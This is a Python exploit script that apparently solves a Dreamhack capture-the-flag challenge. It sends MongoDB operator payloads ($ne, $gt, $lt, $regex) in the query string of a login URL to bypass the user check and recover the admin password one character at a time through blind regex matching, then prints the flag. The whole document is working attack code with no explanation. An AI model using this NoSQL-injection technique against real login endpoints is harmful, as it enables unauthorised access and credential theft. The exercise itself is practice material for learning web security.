import requests
import string
 
url = "http://host1.dreamhack.games:10269/login"
s = string.digits + string.ascii_uppercase + string.ascii_lowercase + "{}"
 
result = ""
for i in range(32):
    for idx, c in enumerate(s):
        payload = "?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]={89e50fa6fafe2604e33c0ba05843" + (result+c)
        print(payload)
        res = requests.get(url+payload)
        
        if res.text.find("admin") != -1:
            result += s[idx]
            print(result)
            break
 
flag = "DH" + result + "}"
 
print(flag)